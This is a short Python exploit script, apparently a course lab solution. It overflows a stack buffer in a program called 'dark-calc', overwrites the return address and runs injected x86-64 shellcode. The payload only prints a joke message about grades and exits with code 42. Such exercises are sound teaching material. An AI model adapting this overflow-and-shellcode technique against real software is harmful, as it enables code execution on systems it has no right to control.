#!/usr/bin/env python3
"""Task 2: execute injected code on dark-calc's fixed executable stack."""
import struct
import sys

STACK_TOP = 0x721000801000
BUFFER = STACK_TOP - 0x30
MESSAGE = b"Hope A will be your grade!\n"
MESSAGE_ADDR = BUFFER + 32 + 39
SHELLCODE = (
    b"\xb8\x01\x00\x00\x00"       # write(1, message, len)
    + b"\xbf\x01\x00\x00\x00"
    + b"\x48\xbe" + struct.pack("<Q", MESSAGE_ADDR)
    + b"\xba" + struct.pack("<I", len(MESSAGE))
    + b"\x0f\x05"
    + b"\xbf\x2a\x00\x00\x00"       # exit(42)
    + b"\xb8\x3c\x00\x00\x00\x0f\x05"
)

assert len(SHELLCODE) == 39
payload = b"A" * 24 + struct.pack("<Q", BUFFER + 32) + SHELLCODE + MESSAGE + b"\n"

sys.stdout.buffer.write(payload)
